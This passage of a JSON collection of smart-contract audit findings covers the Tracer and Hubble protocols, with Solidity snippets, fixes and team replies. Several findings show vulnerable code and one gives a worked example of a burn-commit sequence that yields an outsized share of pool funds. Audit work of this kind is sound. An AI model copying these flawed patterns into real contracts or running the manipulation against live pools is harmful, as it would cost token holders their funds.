console.log(TryDoSomething());\n        console.log(\"Pause =\",pause);\n    }\n}\n```\n\n**Note:** Beware that this does not interfere with any other functionality. ETH has to be sent back to the caller as this will not be automatically reverted.\n\n## Tracer\nWe decided to change how invariant checking works. Instead of checking the invariants on every function call, we now have a contract which can be called at any time by an EOA to do the same invariant checks/pausing. This obviously does not have the same invariant guarantees, as it requires an EOA to start a TX to detect invariant violations, but we decided to make the trade-off anyway. However, it does mean that this issue should not be relevant anymore, because the paused state can in fact be set. Addressed in PR 384.\n\n## Spearbit\nAcknowledged.",
      "summary": "\nThis bug report outlines a problem with the InvariantCheck, LeveragedPool, and PoolCommitter contracts. The checkInvariants() function of the InvariantCheck contract is called via the modifiers checkInvariantsBeforeFunction() and checkInvariantsAfterFunction() of both LeveragedPool and PoolCommitter contracts, and it is meant to pause the contracts if the invariant checks dont hold. The modifiers also contain the require(!paused, \"Pool is paused\"); statement, which reverts the entire transaction and resets the paused variable that was just set. Furthermore, the paused state can only be set by the InvariantCheck contract due to the onlyInvariantCheckContract modifier. This means that the quote tokens will always stay in the pool even if invariants dont hold and all other actions are blocked.\n\nThe InvariantCheck contract calls pause() in LeveragedPool and PoolCommitter if the invariants dont hold. The LeveragedPool and PoolCommitter contracts have modifiers checkInvariantsBeforeFunction() and checkInvariantsAfterFunction() which will make the transaction revert if checkInvariants() sets the paused state, and the paused state can only be set by the InvariantCheck contract.\n\nThe issue is discussed in modifiers-undermine-contract-pausing, and there are a few reasons to reconsider fixing it. When a transaction triggers an invariant check and it is rolled back due to the revert, other transactions might still be executed. With a paused state this wouldnt happen. Pause functionality that doesnt work is misleading for developers and code reviewers, and it is better to delete the dead code which also saves gas. Additionally, withdrawQuote() cannot be executed since the pause state is unreachable.\n\nIf it is preferable to use the pause functionality, it can be done by having a surrounding contract which stores the pause state and calls the underlying logic with a try mechanism. The underlying logic can then be reverted while the surrounding contract keeps the paused state. An implementation example is given in the report.\n\nThe issue was addressed in PR 384 by changing how invariant checking works. Instead of checking the invariants on every function call, a contract can be called at any time by an EOA to do the same invariant checks/pausing. This does not have the same invariant guarantees, as",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Tracer",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Emanuele Ricci",
        "Christoph Michel",
        "Rusty (f7dd60e9cfad19996d73)",
        "Gerard Persoon"
      ]
    },
    {
      "id": "6742",
      "title": "Initial executionPrice is too high",
      "impact": "HIGH",
      "content": "## High Risk Vulnerability Report\n\n## Severity\n**High Risk**\n\n## Context\n**File:** PoolKeeper.sol  \n**Line:** L73\n\n## Description\nWhen a pool is deployed, the initial `executionPrice` is calculated as `firstPrice * 1e18`, where `firstPrice` is retrieved using the `ILeveragedPool(_poolAddress).getOraclePrice()`:\n\n```solidity\ncontract PoolKeeper is IPoolKeeper, Ownable {\n    function newPool(address _poolAddress) external override onlyFactory {\n        int256 firstPrice = ILeveragedPool(_poolAddress).getOraclePrice();\n        int256 startingPrice = ABDKMathQuad.toInt(ABDKMathQuad.mul(ABDKMathQuad.fromInt(firstPrice), FIXED_POINT));\n        executionPrice[_poolAddress] = startingPrice;\n    }\n}\n```\n\nAll other updates to `executionPrice` use the result of `getPriceAndMetadata()` directly without scaling:\n\n```solidity\nfunction performUpkeepSinglePool() {\n    ...\n    (int256 latestPrice, ...) = pool.getUpkeepInformation();\n    ...\n    executionPrice[_pool] = latestPrice;\n    ...\n}\n```\n\n```solidity\ncontract LeveragedPool is ILeveragedPool, Initializable, IPausable {\n    function getUpkeepInformation() {\n        (int256 _latestPrice, ...) = IOracleWrapper(oracleWrapper).getPriceAndMetadata();\n        return (_latestPrice, ...);\n    }\n}\n```\n\nThe price after `firstPrice` will always be lower, therefore its funding rate payment will always go to the shorts and long pool token holders will incur a loss.\n\n## Recommendation\nThe `1e18` scaling should be removed for the initial `executionPrice`:\n\n```solidity\n- int256 startingPrice = ABDKMathQuad.toInt(ABDKMathQuad.mul(ABDKMathQuad.fromInt(firstPrice), FIXED_POINT));\n+ int256 startingPrice = firstPrice;\n```\n\n## Tracer\nValid. Fixed in commit `445377f`.\n\n## Spearbit\nAcknowledged.",
      "summary": "\nThis bug report is about the PoolKeeper.sol#L73 code. When a pool is deployed, the initial executionPrice is calculated as firstPrice * 1e18, where firstPrice is ILeveragedPool(_poolAddress).getOraclePrice() and all other updates to executionPrice use the result of getPriceAndMetadata() directly without scaling. The problem is that the price after the firstPrice will always be lower, resulting in funding rate payment to the shorts and a loss for the long pool token holders.\n\nThe recommendation is to remove the 1e18 scaling for the initial executionPrice. The code should be changed from: int256 startingPrice = ABDKMathQuad.toInt(ABDKMathQuad.mul(ABDKMathQuad.fromInt(firstPrice), FIXED_POINT)); , ! to int256 startingPrice = firstPrice;\n\nThe bug has been fixed in commit 445377f, and has been acknowledged by Spearbit.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Tracer",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Emanuele Ricci",
        "Christoph Michel",
        "Rusty (f7dd60e9cfad19996d73)",
        "Gerard Persoon"
      ]
    },
    {
      "id": "6741",
      "title": "Duplicate user payments for long commits when paid from balance",
      "impact": "HIGH",
      "content": "## Security Report\n\n## Severity\n**High Risk**\n\n## Context\n`PoolCommitter.sol#L299-L306`\n\n## Description\nWhen minting pool tokens in `commit()`, the `fromAggregateBalance` parameter indicates if the user wants to pay from their internal balances or by transferring the tokens. The second `if` condition is wrong and leads to users having to pay twice when calling `commit()` with `CommitType.LongMint` and `fromAggregateBalance = true`.\n\n## Recommendation\nThe second `if` condition should be changed to only perform the transfer for pool token mints if they have not been already paid from internal balances.\n\n```solidity\n-if (commitType == CommitType.LongMint || (commitType == CommitType.ShortMint && !fromAggregateBalance)) {\n+if ((commitType == CommitType.LongMint || commitType == CommitType.ShortMint) && !fromAggregateBalance) {\n    // minting: pull in the quote token from the committer\n    // Do not need to transfer if minting using aggregate balance tokens, since the leveraged pool\n    // already owns these tokens.\n    pool.quoteTokenTransferFrom(msg.sender, leveragedPool, amount);\n}\n```\n\n## Tracer\nAlready fixed in commit `4f2d38f`.\n\n## Spearbit\nPreviously the token transfer was done after the `applyCommitment()` probably to avoid re-entrancy issues. This behavior is different for non-ERC20 tokens such as ERC777 tokens that give control to the sender and recipient. Is the system intended to support these other token standards? Other than that, it is a valid fix.\n\n## Tracer\nOur system only needs to support ERC20 tokens and our threat model encompasses this invariant.\n\n## Spearbit\nAcknowledged.",
      "summary": "\nThis bug report is about an issue in the PoolCommitter.sol file, which is a part of a system that supports ERC20 tokens. The problem is that when minting pool tokens in commit(), the fromAggregateBalance parameter indicates if the user wants to pay from their internal balances or by transferring the tokens. The second if condition is wrong and leads to users having to pay twice when calling commit() with CommitType.LongMint and fromAggregateBalance = true. \n\nThe recommendation is to change the second if condition to only perform the transfer for pool token mints if they have not been already paid from internal balances. The tracer has already fixed the issue in commit 4f2d38f. Spearbit commented that the token transfer was done after the applyCommitment() probably to avoid re-entrancy issues. This behavior is different for non-ERC20 tokens such as ERC777 tokens that give control to the sender and recipient. Tracer responded that their system only needs to support ERC20 tokens and their threat model encompasses this invariant. Spearbit acknowledged this.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Tracer",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Emanuele Ricci",
        "Christoph Michel",
        "Rusty (f7dd60e9cfad19996d73)",
        "Gerard Persoon"
      ]
    },
    {
      "id": "6740",
      "title": "Two different invariantCheck variables used in PoolFactory.deployPool()",
      "impact": "HIGH",
      "content": "## Security Analysis Report\n\n## Severity\n**High Risk**\n\n## Context\n- `PoolFactory.sol#L93-L174`\n- `IPoolFactory.sol#L14`\n\n## Description\nThe `deployPool()` function in the `PoolFactory` contract uses two different `invariantCheck` variables: the one defined as a contracts instance variable and the one supplied as a parameter. This was also documented in Secureums CARE-X report issue \"Invariant check incorrectly fixed\".\n\n```solidity\nfunction deployPool(PoolDeployment calldata deploymentParameters) external override returns (address) {\n    ...\n    poolCommitter.initialize(..., deploymentParameters.invariantCheck, ... ); // version 1 of invariantCheck\n    ...\n    ILeveragedPool.Initialization memory initialization = ILeveragedPool.Initialization({\n        ...\n        _invariantCheckContract: invariantCheck, // version 2 of invariantCheck\n        ...\n    });\n}\n```\n\n## Recommendation\nThe code should be changed to:\n\n```solidity\nfunction deployPool(PoolDeployment calldata deploymentParameters) external override returns (address) {\n    ...\n    - poolCommitter.initialize(..., deploymentParameters.invariantCheck, ... );\n    + poolCommitter.initialize(..., invariantCheck, ... );\n}\n```\n\nIn addition, the `invariantCheck` member of struct `PoolDeployment` in `IPoolFactory.sol` should be removed to prevent mistakes.\n\n## Tracer\n**Valid. Fixed as part of CARE-X commit 98c76bf**\n\n## Spearbit\n**Acknowledged.**",
      "summary": "\nThis bug report is about a function in the PoolFactory contract called deployPool(). This function uses two different variables called invariantCheck, one defined as a contract's instance variable and one supplied as a parameter. This was documented in Secureum's CARE-X report issue \"Invariant check incorrectly fixed\". The recommendation is to change the code to use just the instance variable and also to remove the invariantCheck member of the struct PoolDeployment in IPoolFactory.sol. This issue was fixed as part of CARE-X commit 98c76bf and was acknowledged by Spearbit.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Tracer",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Emanuele Ricci",
        "Christoph Michel",
        "Rusty (f7dd60e9cfad19996d73)",
        "Gerard Persoon"
      ]
    },
    {
      "id": "6739",
      "title": "No price scaling in SMAOracle",
      "impact": "HIGH",
      "content": "## Severity: High Risk\n\n## Context\n- `SMAOracle.sol#L82-L96`\n- `ChainlinkOracleWrapper.sol#L36-L60`\n\n## Description\nThe `update()` function of the `SMAOracle` contract doesnt scale the `latestPrice` although a scaler is set in the constructor. On the other hand, the `_latestRoundData()` function of the `ChainlinkOracleWrapper` contract does scale via `toWad()`.\n\n```solidity\ncontract SMAOracle is IOracleWrapper {\n    constructor(..., uint256 _spotDecimals, ...) {\n        ...\n        require(_spotDecimals <= MAX_DECIMALS, \"SMA: Decimal precision too high\");\n        ...\n        /* `scaler ` is always <= 10^18 and >= 1 so this cast is safe */\n        scaler = int256(10**(MAX_DECIMALS - _spotDecimals));\n        ...\n    }\n\n    function update() internal returns (int256) {\n        /* query the underlying spot price oracle */\n        IOracleWrapper spotOracle = IOracleWrapper(oracle);\n        int256 latestPrice = spotOracle.getPrice();\n        ...\n        priceObserver.add(latestPrice); // doesn 't scale latestPrice\n        ...\n    }\n}\n```\n\n```solidity\ncontract ChainlinkOracleWrapper is IOracleWrapper {\n    function getPrice() external view override returns (int256) {\n        (int256 _price, ) = _latestRoundData();\n        return _price;\n    }\n\n    function _latestRoundData() internal view returns (int256, uint80) {\n        (..., int256 price, ..) = AggregatorV2V3Interface(oracle).latestRoundData();\n        ...\n        return (toWad(price), ...);\n    }\n}\n```\n\n## Recommendation\nThe `latestPrice` variable in the `SMAOracle` contract should be scaled, and the `toWad()` function should be re-introduced. \n\n**Note:** If the `SMAOracle` is only used with WAD-based spot oracles, then `_spotDecimals == 18` must be enforced.\n\n## Tracer\nWe are submitting PR 406 as a mitigation for this. It is a slightly larger PR than we originally intended so as a result it will likely be submitted for several defects here. We would appreciate if each defect could be assessed against it.\n\n## Spearbit\nAcknowledged.",
      "summary": "\nThis bug report is about the SMAOracle and ChainlinkOracleWrapper contracts. The update() function of the SMAOracle contract does not scale the latestPrice variable, while the _latestRoundData() function of the ChainlinkOracleWrapper contract does scale via toWad(). The recommendation is to scale the latestPrice variable in the SMAOracle contract, and reintroduce the toWad() function. If the SMAOracle is only used with WAD based spot oracles, then _spotDecimals == 18 must be enforced. A PR (406) is being submitted as a mitigation for this.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Tracer",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Emanuele Ricci",
        "Christoph Michel",
        "Rusty (f7dd60e9cfad19996d73)",
        "Gerard Persoon"
      ]
    },
    {
      "id": "6738",
      "title": "Pool token price is incorrect when there is more than one pending upkeep",
      "impact": "HIGH",
      "content": "## Severity: Critical\n\n**Context:** PoolCommitter.sol#L384-391\n\n## Description\nThe amount of pool tokens to mint and quote tokens to burn is determined by the pool token price. This price, for a commit at update interval ID X, should not be influenced by any pending commits for IDs greater than X.\n\nHowever, in the current implementation, the price includes the current total supply, but burns commits burn pool tokens immediately when `commit()` is called, not when `upkeep()` is executed.\n\n```solidity\n// pool token price computation at execution of updateIntervalId, example for long price\npriceHistory[updateIntervalId].longPrice = longBalance /\n(IERC20(tokens[LONG_INDEX]).totalSupply() + _totalCommit[updateIntervalId].longBurnAmount +\n_totalCommit[updateIntervalId].longBurnShortMintAmount);\n```\n\nThe implementation tries to fix this by adding back all tokens burned at this `updateIntervalId`, but it must also add back all tokens that were burned in future commits (i.e., when ID > `updateIntervalID`). This issue allows an attacker to get a better pool token price and steal pool token funds.\n\n### Example\nGiven the preconditions:\n- `long.totalSupply() = 2000`\n- User owns `1000 long` pool tokens\n- `lastPriceTimestamp = 100`\n- `updateInterval = 10`\n- `frontRunningInterval = 5`\n\nAt time `104`: User commits to `BurnLong 500` tokens in `appropriateUpdateIntervalId = 5`. Upon execution, the user receives a long price of `longBalance / (1500 + 500)` if no further future commitments are made. Then, as tokens are burned:\n\n```\ntotalPoolCommitments[5].longBurnAmount = 500;\nlong.totalSupply -= 500;\n```\n\nAt time `106`: User commits another `500` tokens to `BurnLong` at `appropriateUpdateIntervalId = 6` as they are now past the `frontRunningInterval` and are scheduled for the next update. Now:\n\n```\ntotalPoolCommitments[6].longBurnAmount = 500;\nlong.totalSupply -= 500;\n```\n\nFinally, the 5th update interval ID is executed by the pool keeper but at:\n\n```\nlongPrice = longBalance / (IERC20(tokens[LONG_INDEX]).totalSupply() + _totalCommit[5].longBurnAmount + _totalCommit[5].longBurnShortMintAmount) = longBalance / (1000 + 500)\n```\n\nThis results in a better price than what the user should have received. With a `longBalance` of `2000`, the user receives:\n```\n500 * (2000 / 1500) = 666.67 tokens\n```\nexecuting the first burn commit and:\n```\n500 * ((2000 - 666.67) / 1500) = 444.43 tokens\n```\nexecuting the second one. The total pool balance received by the user is:\n```\n1111.1 / 2000 = 55.555%\n```\nby burning only `1000 / 2000 = 50%` of the pool token supply.\n\n## Recommendation\nPool price computation should take into account all tokens that have been burned, not only the tokens that have been burned in the `updateIntervalID` of the commit. Note that there can be many pending total commits if `frontRunningInterval > updateInterval`.\n\n**Tracer:** Valid. Fixed in commit `669a61a`.\n\n**Spearbit:** Acknowledged.",
      "summary": "\nThis bug report concerns a critical issue in the PoolCommitter.sol file, which is part of a pool token system. The issue is that the amount of pool tokens to mint and quote tokens to burn is determined by the pool token price, which should not be influenced by any pending commits for IDs greater than the current one. However, in the current implementation, the pool token price computation takes into account only the tokens that have been burned in the updateIntervalID of the commit, not all tokens that have been burned. This allows an attacker to get a better pool token price and steal pool token funds.\n\nTo fix this issue, the pool price computation should take into account all tokens that have been burned, not only the tokens that have been burned in the updateIntervalID of the commit. This was fixed in commit 669a61a.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Spearbit",
      "protocol_name": "Tracer",
      "source_link": "https://github.com/spearbit/portfolio/blob/master/pdfs/Tracer-Spearbit-Security-Review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Emanuele Ricci",
        "Christoph Michel",
        "Rusty (f7dd60e9cfad19996d73)",
        "Gerard Persoon"
      ]
    },
    {
      "id": "42484",
      "title": "[N-02] Missing Re-entrancy Guard",
      "impact": "LOW",
      "content": "\nThe re-entrancy guard is missing on the Eth anchor interaction. The external router interaction can cause to the re-entrancy vulnerability.\n\n### Proof of Concept\n\nNavigate to the following contract functions:\n\n<https://github.com/code-423n4/2022-02-hubble/blob/8c157f519bc32e552f8cc832ecc75dc381faa91e/contracts/InsuranceFund.sol#L39>\n\n### Recommended Mitigation Steps\n\nFollow the check effect interaction pattern or put re-entrancy guard.\n\n**[atvanguard (Hubble) commented](https://github.com/code-423n4/2022-02-hubble-findings/issues/92#issuecomment-1051705553):**\n > Good QA report.\n\n**[moose-code (judge) commented](https://github.com/code-423n4/2022-02-hubble-findings/issues/92#issuecomment-1059792709):**\n > Lots of good insights here :100: \n\n\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Hubble",
      "source_link": "https://code4rena.com/reports/2022-02-hubble",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42483",
      "title": "[N-01] Use of Block.timestamp",
      "impact": "LOW",
      "content": "\nBlock timestamps have historically been used for a variety of applications, such as entropy for random numbers (see the Entropy Illusion for further details), locking funds for periods of time, and various state-changing conditional statements that are time-dependent. Miners have the ability to adjust timestamps slightly, which can prove to be dangerous if block timestamps are used incorrectly in smart contracts.\n\n### Proof of Concept\n\nNavigate to the following contract:\n\n<https://github.com/code-423n4/2022-02-hubble/blob/8c157f519bc32e552f8cc832ecc75dc381faa91e/contracts/legos/HubbleBase.sol#L49>\n\n### Recommended Mitigation Steps\n\nBlock timestamps should not be used for entropy or generating random numbersi.e., they should not be the deciding factor (either directly or through some derivation) for winning a game or changing an important state.\n\nTime-sensitive logic is sometimes required; e.g., for unlocking contracts (time-locking), completing an ICO after a few weeks, or enforcing expiry dates. It is sometimes recommended to use block.number and an average block time to estimate times; with a 10 second block time, 1 week equates to approximately, 60480 blocks. Thus, specifying a block number at which to change a contract state can be more secure, as miners are unable to easily manipulate the block number.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Hubble",
      "source_link": "https://code4rena.com/reports/2022-02-hubble",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "42482",
      "title": "[M-17] Usage of an incorrect version of Ownable library can potentially malfunction all `onlyOwner` functions",
      "impact": "MEDIUM",
      "content": "_Submitted by robee_\n\nThe current implementaion is using a non-upgradeable version of the Ownable library. Instead of the upgradeable version: @openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol.\n\nA regular, non-upgradeable Ownable library will make the deployer the default owner in the constructor. Due to a requirement of the proxy-based upgradeability system, no constructors can be used in upgradeable contracts. Therefore, there will be no owner when the contract is deployed as a proxy contract\n\n### Recommended Mitigation Steps\n\nUse @openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol and @openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol instead.\n\nAnd add __Ownable_init(); at the beginning of the initializer.\n    \nOracle.sol<br>\nAMM.sol\n\n\n\n***\n\n",
      "summary": "\nThe current implementation of the code is using a non-upgradeable version of the Ownable library, which means that the deployer becomes the default owner in the constructor. However, this is not compatible with the proxy-based upgradeability system, which does not allow constructors to be used in upgradeable contracts. This results in there being no owner when the contract is deployed as a proxy contract. To fix this issue, it is recommended to use the upgradeable version of the Ownable library and the Initializable library. Additionally, the __Ownable_init(); function should be added at the beginning of the initializer. This bug affects the Oracle and AMM contracts.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Hubble",
      "source_link": "https://code4rena.com/reports/2022-02-hubble",
      "github_link": "https://github.com/code-423n4/2022-02-hubble-findings/issues/140",
      "tags": [],
      "finders": []
    },
    {
      "id": "42481",
      "title": "[M-15] [WP-H7] `InsuranceFund#syncDeps()` may cause users' fund loss",
      "impact": "MEDIUM",
      "content": "_Submitted by WatchPug_\n\n<https://github.com/code-423n4/2022-02-hubble/blob/ed1d885d5dbc2eae24e43c3ecbf291a0f5a52765/contracts/InsuranceFund.sol#L116-L119>\n\n```solidity\nfunction syncDeps(IRegistry _registry) public onlyGovernance {\n    vusd = IERC20(_registry.vusd());\n    marginAccount = _registry.marginAccount();\n}\n```\n\nThe `Governance` address can call `InsuranceFund.sol#syncDeps()` to change the contract address of `vusd` anytime.\n\nHowever, since the tx to set a new address for `vusd` can get in between users' txs to deposit and withdraw, in some edge cases, it can result in users' loss of funds.\n\n### Proof of Concept\n\n1.  Alice deposited `1,000,000 VUSD` to `InsuranceFund`;\n2.  Gov called `syncDeps()` and set `vusd` to the address of `VUSDv2`;\n3.  Alice called `withdraw()` with all the `shares` and get back `0 VUSDv2`.\n\nAs a result, Alice suffered a fund loss of `1,000,000 VUSD`.\n\n##### Recommended Mitigation Steps\n\n1.  Consider making `vusd` unchangeable;\n2.  If a possible migration of `vusd` must be considered, consider changing the `syncDeps()` to:\n\n```solidity\nfunction syncDeps(IRegistry _registry) public onlyGovernance {\n    uint _balance = balance();\n    vusd = IERC20(_registry.vusd());\n    require(balance() >= _balance);\n    marginAccount = _registry.marginAccount();\n}\n```\n\n**[atvanguard (Hubble) acknowledged and commented](https://github.com/code-423n4/2022-02-hubble-findings/issues/100#issuecomment-1049491356):**\n > Acknowledging but yes system heavily relies on the admins to do the right thing, the right way. We might remove several such upgradeability rights during a broader refactor of the entire system.\n\n**[moose-code (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-02-hubble-findings/issues/100#issuecomment-1063884365):**\n > Downgrading to medium as this is largely admin related. \n\n\n\n***\n\n",
      "summary": "\nThis bug report is about a potential issue in the `InsuranceFund.sol` contract, where the `Governance` address can change the contract address of `vusd` at any time. This could potentially result in users losing their funds if their transactions to deposit or withdraw happen to be in between the change of the `vusd` address. A proof of concept was provided where a user lost `1,000,000 VUSD` due to this issue. The report recommends making `vusd` unchangeable or changing the `syncDeps()` function to prevent this type of loss from occurring. The team behind the contract has acknowledged the issue and plans to make changes to prevent it in the future. The severity of the bug has been downgraded to medium as it is mostly related to administrative actions.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Hubble",
      "source_link": "https://code4rena.com/reports/2022-02-hubble",
      "github_link": "https://github.com/code-423n4/2022-02-hubble-findings/issues/100",
      "tags": [],
      "finders": []
    },
    {
      "id": "42480",
      "title": "[M-13] Assets sent from `MarginAccount` to `InsuranceFund` will be locked forever",
      "impact": "MEDIUM",
      "content": "_Submitted by 0xliumin, also found by hyh, minhquanym, and WatchPug_\n\n<https://github.com/code-423n4/2022-02-hubble/blob/ed1d885d5dbc2eae24e43c3ecbf291a0f5a52765/contracts/MarginAccount.sol#L377><br>\n\nAssets sent from MarginAccount to InsuranceFund will be locked forever.\n\n### Proof of Concept\n\nThe insurance fund doesn't have a way to transfer non-vusd out of the contract.\n\nAssets transferred to the InsuranceFund will be locked forever.\n\n### Recommended Mitigation Steps\n\nHave a way for governance to sweep tokens to swap them.\n\n**[atvanguard (Hubble) confirmed and commented](https://github.com/code-423n4/2022-02-hubble-findings/issues/128#issuecomment-1049469298):**\n > Yes, this a known issue and already on our roadmap.\n\n**[moose-code (judge) commented](https://github.com/code-423n4/2022-02-hubble-findings/issues/128#issuecomment-1059916382):**\n > The insurance fund contract is also upgradeable so it's a fairly simple fix upgrade and to sweep the tokens out when the time comes - i.e. tokens won't be lost forever. Still would be better to have it in from the start to avoid this process. Considering moving to medium. Assessing other issues first, will circle back.\n\n**[moose-code (judge) decreased severity to Medium and commented](https://github.com/code-423n4/2022-02-hubble-findings/issues/128#issuecomment-1063363578):**\n > Moving to medium as contracts are upgradeable so the tokens can always be collected later. If the contract was non-upgradeable I would have left as high.\n\n\n\n***\n\n",
      "summary": "\nThis bug report discusses an issue with the MarginAccount contract, where assets transferred to the InsuranceFund are unable to be transferred out. This means that these assets will be locked in the contract forever. The report recommends implementing a way for governance to sweep these tokens in order to prevent them from being lost. The Hubble team has confirmed that this is a known issue and is already on their roadmap. The judge has also commented that the insurance fund contract is upgradeable, so the tokens can still be collected later. The severity of this issue has been decreased to medium.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Hubble",
      "source_link": "https://code4rena.com/reports/2022-02-hubble",
      "github_link": "https://github.com/code-423n4/2022-02-hubble-findings/issues/128",
      "tags": [],
      "finders": []
    },
    {
      "id": "42479",
      "title": "[M-12] AMM Cannot Be `initialize()` Except By Governance",
      "impact": "MEDIUM",
      "content": "_Submitted by kirk-baird_\n\n<https://github.com/code-423n4/2022-02-hubble/blob/main/contracts/AMM.sol#L93-L108><br>\n<https://github.com/code-423n4/2022-02-hubble/blob/main/contracts/AMM.sol#L730-L734><br>\n<https://github.com/code-423n4/2022-02-hubble/blob/main/contracts/legos/Governable.sol#L10-L13><br>\n\nThe contact `AMM.sol` cannot be initialize unless it is called from the `_governance` address.\n\nThis prevents the use of a deployer account and requires the governance to be able to deploy proxy contracts and encode the required arguements. If this is not feasible then the contract cannot be deployed.\n\n### Proof of Concept\n\n`initialize()` calls `_setGovernace(_governance);` which will store the governance address.\n\nFollowing this it will call `syncDeps(_registry);` which has `onlyGovernance` modifier.  Thus, if the `msg.sender` of `initialize()` is not the same as the parameter `_governance` then the initialisation will revert.\n\n```solidity\n    function initialize(\n        address _registry,\n        address _underlyingAsset,\n        string memory _name,\n        address _vamm,\n        address _governance\n    ) external initializer {\n        _setGovernace(_governance);\n\n        vamm = IVAMM(_vamm);\n        underlyingAsset = _underlyingAsset;\n        name = _name;\n        fundingBufferPeriod = 15 minutes;\n\n        syncDeps(_registry);\n    }\n```\n\n### Recommended Mitigation Steps\n\nConsider adding the steps manually to `initialize()`. i.e.\n\n```solidity\n    function initialize(\n        address _registry,\n        address _underlyingAsset,\n        string memory _name,\n        address _vamm,\n        address _governance\n    ) external initializer {\n        _setGovernace(_governance);\n\n        vamm = IVAMM(_vamm);\n        underlyingAsset = _underlyingAsset;\n        name = _name;\n        fundingBufferPeriod = 15 minutes;\n\n        IRegistry registry = IRegistry(_registry);\n        clearingHouse = registry.clearingHouse();\n        oracle = IOracle(registry.oracle());\n}\n```\n\n**[atvanguard (Hubble) confirmed and resolved](https://github.com/code-423n4/2022-02-hubble-findings/issues/51)**\n\n\n\n***\n\n",
      "summary": "\nThe contract `AMM.sol` has a bug that prevents it from being initialized unless it is called from a specific address. This means that a deployer account cannot be used and the governance must be able to deploy proxy contracts and encode the necessary arguments. A proof of concept has been provided to demonstrate the issue and a suggested solution is to manually add the necessary steps to the `initialize()` function. The bug has been confirmed and resolved by the Hubble team.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Hubble",
      "source_link": "https://code4rena.com/reports/2022-02-hubble",
      "github_link": "https://github.com/code-423n4/2022-02-hubble-findings/issues/51",
      "tags": [],
      "finders": []
    },
    {
      "id": "42478",
      "title": "[M-10] Blocking of the VUSD withdrawals is possible if the reserve token doesn't support zero value transfers",
      "impact": "MEDIUM",
      "content": "_Submitted by hyh_\n\nVUSD withdraw queue will be blocked and user funds frozen simply by requesting a zero value withdraw, if the reserve token doesn't support zero value transfers.\n\nPutting it medium only on an assumption that reserve will be USDC and the probability is low, but VUSD do allow any reserve token and the impact here is both funds freeze and stopping of the operations\n\n### Proof of Concept\n\nIt is possible to burn zero amount in OZ implementation:\n\n<https://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable/blob/master/contracts/token/ERC20/ERC20Upgradeable.sol#L285-L300>\n\nSo, withdraw will burn zero amount and put it to the queue:\n\n<https://github.com/code-423n4/2022-02-hubble/blob/main/contracts/VUSD.sol#L48>\n\nUSDC does support zero value transfers, but not all the tokens do:\n\n<https://github.com/d-xo/weird-erc20#revert-on-zero-value-transfers>\n\nCurrently VUSD can use any reserve token:\n\n<https://github.com/code-423n4/2022-02-hubble/blob/main/contracts/VUSD.sol#L33>\n\nWithdraw queue position can be modified in the `processWithdrawals` function only.\n\nBut it will fail every time on the zero amount entry, as there is no way to skip it (and mint VUSD back, for example), so anything else after this zero entry will not be processed:\n\n<https://github.com/code-423n4/2022-02-hubble/blob/main/contracts/VUSD.sol#L62>\n\nThis way the withdrawal functionality and the corresponding user funds will be frozen within VUSD contract, which will become inoperable\n\n### Recommended Mitigation Steps\n\nConsider adding a zero amount check, as it doesnt cost much, while zero transfer doesn't make sense anyway.\n\nNow:\n\n    reserveToken.safeTransfer(withdrawal.usr, withdrawal.amount);\n    reserve -= withdrawal.amount;\n\nTo be:\n\n    if (withdrawal.amount > 0) {\n    \treserveToken.safeTransfer(withdrawal.usr, withdrawal.amount);\n    \treserve -= withdrawal.amount;\n    }\n\n**[atvanguard (Hubble) disputed and commented](https://github.com/code-423n4/2022-02-hubble-findings/issues/29#issuecomment-1049602014):**\n > Not an issue because reserveToken is intended to be USDC.\n\n**[JasoonS (judge) commented](https://github.com/code-423n4/2022-02-hubble-findings/issues/29#issuecomment-1060019732):**\n> Not specified in spec for the audit. Giving to submitter.\n\n\n\n***\n\n",
